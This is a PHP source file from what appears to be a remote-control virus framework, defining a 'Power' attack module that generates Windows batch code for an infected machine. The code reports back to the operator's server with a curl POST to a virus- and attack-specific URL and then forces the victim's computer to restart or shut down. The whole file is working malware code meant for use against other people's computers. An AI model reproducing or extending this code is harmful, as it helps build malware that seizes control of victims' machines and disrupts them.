<?php

namespace Kelvinho\Virus\Attack\Packages\Windows\OneTime;

use Kelvinho\Virus\Attack\AttackBase;
use Kelvinho\Virus\Attack\BaseScriptWin;

/**
 * Class Power. Either restarts or turns off the computer.
 *
 * @package Kelvinho\Virus\Attack\Packages\Windows\OneTime
 * @author Quang Ho <157239q@gmail.com>
 * @copyright Copyright (c) 2020 Quang Ho <https://github.com/157239n>
 * @license http://www.opensource.org/licenses/mit-license.html  MIT License
 */
class Power extends AttackBase {
    public static int $POWER_SHUTDOWN = 1;
    public static int $POWER_RESTART = 0;
    private int $type;

    public function __construct() {
        parent::__construct();
        $this->type = self::$POWER_RESTART;
    }

    public function isShutdown(): bool {
        return $this->type == self::$POWER_SHUTDOWN;
    }

    public function setType(int $type): void {
        $this->type = $type;
    }

    protected function setState(string $json): void {
        $state = json_decode($json, true);
        $this->type = $state["type"];
    }

    protected function getState(): string {
        $state = [];
        $state["type"] = $this->type;
        return json_encode($state);
    }

    private function generateUploadCode(): string {
        ob_start(); ?>
        curl -d "" --post301 --post302 --post303 -L <?php echo ALT_SECURE_DOMAIN . "/vrs/$this->virus_id/aks/$this->attack_id/report"; ?>
        <?php return ob_get_clean();
    }

    public function generateBatchCode(): string {
        ob_start();
        echo BaseScriptWin::payloadConfirmationLoop($this->virus_id, $this->attack_id, $this->generateUploadCode()); //@formatter:off ?>
        shutdown -<?php if ($this->type == self::$POWER_RESTART) {
            echo "r";
        } else {
            echo "s";
        } ?> -t 3
        <?php return ob_get_clean(); //@formatter:on
    }

    public function processExtras(string $resourceIdentifier): void {
    }
}
